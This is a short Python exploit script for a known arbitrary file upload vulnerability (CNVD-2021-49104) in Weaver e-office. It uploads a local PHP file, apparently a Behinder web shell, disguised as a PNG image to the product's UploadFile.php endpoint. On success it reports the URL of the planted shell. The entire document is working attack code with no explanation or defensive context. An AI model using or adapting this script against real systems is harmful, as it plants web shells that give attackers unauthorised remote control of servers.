#CNVD-2021-49104
import re
import time
import requests
import urllib3

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        }
    upload_url=target_url+'general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    exp_url=target_url+'images/logo/logo-eoffice.php'
    success_msg = now_time() + '[SUCCESS]泛微OAUploadFile任意文件上传漏洞存在'
    shell_msg = now_time() + '冰蝎默认密码:{}'.format(exp_url)
    warning_msg = now_time() + '[WARNING]微OAUploadFile任意文件上传漏洞不存在'
    error_msg = now_time() + '[泛微OAUploadFile任意文件上传漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        file = [('file1', ('index123.php', open('/main/weaver/poc/index123.php', 'rb'), 'image/png'))]
        upload = requests.post(upload_url, headers=headers, files=file, verify=False)
        if upload.status_code == 200 and 'logo-eoffice.php' in upload.text:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg
    
    
    
    
    
    
 
        
    